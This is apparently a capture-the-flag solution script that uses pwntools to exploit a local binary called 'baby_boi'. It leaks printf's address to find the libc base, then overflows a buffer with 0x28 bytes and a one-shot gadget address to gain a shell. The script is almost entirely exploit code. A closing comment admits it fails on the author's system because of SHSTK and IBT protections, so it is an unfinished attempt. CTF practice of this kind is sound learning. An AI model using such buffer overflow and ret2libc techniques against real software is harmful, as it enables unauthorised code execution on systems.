from pwn import *

target = process("./baby_boi")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

print(target.recvuntil(b"ere I am: "))

leak = target.recvline()
leak = leak.strip(b"\n")

base = int(leak, 16) - libc.symbols['printf']

print("wooo:" + hex(base))

oneshot = base + 0xebce2

payload = b""
payload += b"0"*0x28         # Offset to oneshot gadget
payload += p64(oneshot)     # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()

## Won't work. My libc has SHSTK and IBT. Can come back later